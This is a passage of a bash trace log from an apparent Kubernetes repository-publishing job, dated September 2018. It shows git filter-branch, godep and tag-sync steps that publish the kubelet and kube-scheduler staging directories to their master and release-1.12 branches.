//g'\n>\t+ local k_base_commit=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' -z 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ']'\n>\t++ git-find-merge 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 upstream/release-1.12\n>\t+++ git rev-list '30b0b2d36c9719ec02a6a0414db2ddc802b040e7^1..upstream/release-1.12' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t++ tail -1\n>\t+++ git rev-list 30b0b2d36c9719ec02a6a0414db2ddc802b040e7..upstream/release-1.12 --ancestry-path\n>\t+++ git rev-parse 30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ local k_base_merge=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' -z 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ']'\n>\t+ git branch -f filtered-branch-base 30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\tRewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/kubelet.\n>\t+ echo 'Rewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/kubelet.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/kubelet 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/kubelet\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\tRunning git filter-branch ...\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/kubelet -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=4ea388d1b524c4dd064f623b256decf83b709fa9\n>\t++ git log --first-parent --format=%H --reverse 4ea388d1b524c4dd064f623b256decf83b709fa9..HEAD\n>\tChecking out branch release-1.12.\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.12.'\n>\t+ git checkout -q release-1.12\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=6616588648145f6b060184f5e516c0a665eaafe5\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=6616588648145f6b060184f5e516c0a665eaafe5\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 6616588648145f6b060184f5e516c0a665eaafe5 '!=' 6616588648145f6b060184f5e516c0a665eaafe5 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.12,api:release-1.12 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=6616588648145f6b060184f5e516c0a665eaafe5\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.12,api:release-1.12 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/kubelet\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/kubelet/\") or . == \"k8s.io/kubelet\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.12,api:release-1.12\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' -z 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ']'\n>\t++ git-find-merge 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '30b0b2d36c9719ec02a6a0414db2ddc802b040e7^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 30b0b2d36c9719ec02a6a0414db2ddc802b040e7..upstream-branch --ancestry-path\n>\t+++ git rev-parse 30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ local k_last_kube_merge=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.\n>\t+ read k_commit dep_commit\n>\t++ look -b 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ../kube-commits-apimachinery-release-1.12\n>\t+ '[' -z 3b307a310a061fc549c8801bfe72ea3d30948920 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to 3b307a310a061fc549c8801bfe72ea3d30948920'\n>\t+ git checkout -q 3b307a310a061fc549c8801bfe72ea3d30948920\n>\tChecking out k8s.io/apimachinery to 3b307a310a061fc549c8801bfe72ea3d30948920\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.'\n>\t+ local k_commit=\n>\tLooking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ../kube-commits-api-release-1.12\n>\t+ '[' -z 1b7003d0d679cdd8fa4121a3304319ec4c6139f2 ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 1b7003d0d679cdd8fa4121a3304319ec4c6139f2'\n>\tChecking out k8s.io/api to 1b7003d0d679cdd8fa4121a3304319ec4c6139f2\n>\t+ git checkout -q 1b7003d0d679cdd8fa4121a3304319ec4c6139f2\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\tGodeps.json hasn't changed!\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 6616588648145f6b060184f5e516c0a665eaafe5\n>\t+ echo 'Remove redundant godep commits on-top of 6616588648145f6b060184f5e516c0a665eaafe5.'\n>\t+ git reset --soft -q 6616588648145f6b060184f5e516c0a665eaafe5\n>\tRemove redundant godep commits on-top of 6616588648145f6b060184f5e516c0a665eaafe5.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/kubelet\n>\t+ local repo=kubelet\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '6616588 Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-kubelet-release-1.12'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-kubelet-release-1.12\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=6616588648145f6b060184f5e516c0a665eaafe5\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kubelet-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kubelet-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-kubelet-release-1.12.sh --dependencies apimachinery:release-1.12,api:release-1.12 -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\t++ git rev-parse release-1.12\n>\t+ '[' 6616588648145f6b060184f5e516c0a665eaafe5 '!=' 6616588648145f6b060184f5e516c0a665eaafe5 ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[09 Sep 18 09:54 UTC]: Successfully constructed release-1.12\n>[09 Sep 18 09:54 UTC]: Successfully ensured /go-workspace/src/k8s.io/kube-scheduler exists\n>[09 Sep 18 09:54 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Sep 18 09:54 UTC]: /publish_scripts/construct.sh kube-scheduler master master apimachinery:master,apiserver:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-scheduler kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-scheduler\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,apiserver:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-scheduler\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' f26556cc14e2a01a1904805566e082484c1f33f9 '!=' f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>\t+ echo 'Skipping sync because upstream/master at f26556cc14e2a01a1904805566e082484c1f33f9 did not change since last sync.'\n>\tSkipping sync because upstream/master at f26556cc14e2a01a1904805566e082484c1f33f9 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-scheduler-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-scheduler-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-kube-scheduler-master.sh --dependencies apimachinery:master,apiserver:master -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\t++ git rev-parse master\n>\t+ '[' 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2 '!=' 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2 ']'\n>\t+ git checkout master\n>\tYour branch is up-to-date with 'origin/master'.\n>\tAlready on 'master'\n>[09 Sep 18 09:55 UTC]: Successfully constructed master\n>[09 Sep 18 09:55 UTC]: /publish_scripts/construct.sh kube-scheduler release-1.12 release-1.12 apimachinery:release-1.12,apiserver:release-1.12  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-scheduler kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-scheduler\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-scheduler\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tCleaning up checkout.\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\t+ echo 'Switching to origin/release-1.12.'\n>\tSwitching to origin/release-1.12.\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 '!=' f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>\tUpstream branch upstream/release-1.12 moved from 'f26556cc14e2a01a1904805566e082484c1f33f9' to '30b0b2d36c9719ec02a6a0414db2ddc802b040e7'. We have to sync.\n>\t+ echo 'Upstream branch upstream/release-1.12 moved from '\\''f26556cc14e2a01a1904805566e082484c1f33f9'\\'' to '\\''30b0b2d36c9719ec02a6a0414db2ddc802b040e7'\\''. We have to sync.'\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/kube-scheduler release-1.12 release-1.12 apimachinery:release-1.12,apiserver:release-1.12 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/kube-scheduler\n>\t+ local src_branch=release-1.12\n>\t+ local dst_branch=release-1.12\n>\t+ local deps=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tf79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 8 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-1.12 commit f79e0b4b33a9f995cdc1beff2e5225bb771be606.\n>\t+ echo 'Starting at existing release-1.12 commit f79e0b4b33a9f995cdc1beff2e5225bb771be606.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.12\n>\tBranch upstream-branch set up to track remote branch release-1.12 from upstream.\n>\t++ git rev-parse upstream-branch\n>\t+ echo 'Checked out source commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\tChecked out source commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.12\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.12\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' -z 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ']'\n>\t++ git-find-merge 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 upstream/release-1.12\n>\t++ tail -1\n>\t+++ git rev-list '30b0b2d36c9719ec02a6a0414db2ddc802b040e7^1..upstream/release-1.12' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 30b0b2d36c9719ec02a6a0414db2ddc802b040e7..upstream/release-1.12 --ancestry-path\n>\t+++ git rev-parse 30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ local k_base_merge=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' -z 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ']'\n>\t+ git branch -f filtered-branch-base 30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\tRewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/kube-scheduler.\n>\t+ echo 'Rewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/kube-scheduler.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/kube-scheduler 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/kube-scheduler\n>\tRunning git filter-branch ...\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/kube-scheduler -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=a0ae31695b456bef5c4ee1597afd9934e8b9b019\n>\t++ git log --first-parent --format=%H --reverse a0ae31695b456bef5c4ee1597afd9934e8b9b019..HEAD\n>\tChecking out branch release-1.12.\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.12.'\n>\t+ git checkout -q release-1.12\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 